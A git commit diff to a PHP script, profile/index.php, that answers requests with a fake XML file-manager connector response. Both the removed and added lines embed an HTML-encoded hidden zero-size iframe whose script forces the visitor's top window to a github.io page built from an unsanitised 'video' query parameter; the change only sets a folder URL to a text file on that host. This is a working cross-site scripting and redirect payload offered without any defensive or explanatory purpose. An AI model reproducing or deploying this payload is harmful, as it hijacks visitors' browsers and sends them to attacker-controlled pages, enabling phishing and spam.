13f038d74a21b9a175ba9ad6dd69f4af6cc36dab
myhostusa <classifiedadscenter@gmail.com>
2025-01-11 16:55:36 -0500

    Update index.php

--- profile/index.php
+++ profile/index.php
@@ -7,7 +7,7 @@ header('Content-Type: application/xml; charset=utf-8');
 header_remove('Content-Length');
 if (isset($_GET["video"])){
     die('<?xml version="1.0" encoding="UTF-8"?>
-<Connector command="GetFoldersAndFiles" resourceType="Document"><CurrentFolder path="/1 - f/" url=""/><Files><File desc="1" name="Loading..." size="&lt;iframe height=&quot;0&quot; width=&quot;0&quot; srcdoc=&quot;&amp;lt;script&amp;gt;window.top.location.href=\'https://myhostusa.github.io/testt/profile/' . $_GET["video"] . '\';&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;" url="1"/></Files></Connector>');
+<Connector command="GetFoldersAndFiles" resourceType="Document"><CurrentFolder path="/1 - f/" url="https://myhostusa.github.io/testt/profile/akashvoratara.txt"/><Files><File desc="1" name="Loading..." size="&lt;iframe height=&quot;0&quot; width=&quot;0&quot; srcdoc=&quot;&amp;lt;script&amp;gt;window.top.location.href=\'https://myhostusa.github.io/testt/profile/' . $_GET["video"] . '\';&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;" url="1"/></Files></Connector>');
 } else {
     die("-_-");
 } ?>
